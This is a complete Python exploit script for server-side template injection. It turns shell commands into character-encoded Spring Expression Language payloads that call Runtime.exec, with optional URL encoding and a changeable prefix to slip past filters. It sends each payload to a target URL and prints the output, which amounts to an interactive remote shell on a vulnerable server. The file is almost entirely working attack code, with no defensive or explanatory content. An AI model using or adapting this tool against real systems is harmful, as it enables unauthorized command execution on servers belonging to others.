#!/usr/bin/python3
from cmd import Cmd
import urllib.parse, argparse, requests
from time import gmtime, strftime

parser = argparse.ArgumentParser(description="RCE.")
parser.add_argument("-t", "--target",metavar="",required=True,help="Target to give an STI")
parser.add_argument("-u","--url-encode", action="store_true", help="URL Encode")
parser.add_argument("-p","--prefix", type=ascii, help="Modify Payload Prefix")
parser.add_argument("-d","--debug", action="store_true",default=False, help="Print debug")
args = parser.parse_args()

target=args.target
url_encode=args.url_encode
modify_prefix=args.prefix
DEBUG=args.debug

def yellow(string):
	return '\033[1;33m%s\033[0m' % string

def debug(x,y):
	if DEBUG:
		print(x+yellow(y))

class Terminal(Cmd):
	start_time=strftime("%H:%M:%S", gmtime())
	prompt=yellow('[%s] ==> ' % start_time)

	def decimal_encode(self,args):

		debug('URL Encoding: ',str(url_encode))

		command=args

		decimals=[]

		for i in command:
			decimals.append(str(ord(i)))

		payload='''${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)''' % decimals[0]
		

		for i in decimals[1:]:
			line='.concat(T(java.lang.Character).toString({}))'.format(i)
			payload+=line

		payload+=').getInputStream())}'
		if modify_prefix:
			payload = payload.replace("$", modify_prefix[1:-1], 1)		
		if url_encode:
			payload_encoded=urllib.parse.quote_plus(payload,safe='')
			debug('Payload: ',payload_encoded)
			return payload_encoded
		else:
			debug('Payload: ',payload)
			return payload


	def ssti(self,args):
		start_time=strftime("%H:%M:%S", gmtime())
		base_url=target
		payload=self.decimal_encode(args)

		url=base_url+payload

		headers = {} #This usually has to be added but there is a Burp extension to convert burp headers into python request headers.
		debug('Headers: ',str(headers))
		try:
			response=requests.get(url, headers=headers)
			output=response.text
			#The next line is used to parse out the output, this might be clean but it also may need work. Depends on the vuln.
			
			# ssti=str(output).split('&#39;')[1].rstrip() 
			
			print (output)
		except:
			print('Unable to send command: %s' % yellow(args))
			print('Qutting at [%s]' % yellow(start_time))
			quit()
			#Quit after a command fails just incase the server has been killed.


	def default(self,args):
		self.ssti(args)
		print()
try:
	if DEBUG == True:
		debug('Target: ',target)
	term=Terminal()
	term.cmdloop()
except KeyboardInterrupt:
	print()
	print('Detected CTRL+C, exiting...')
	quit()
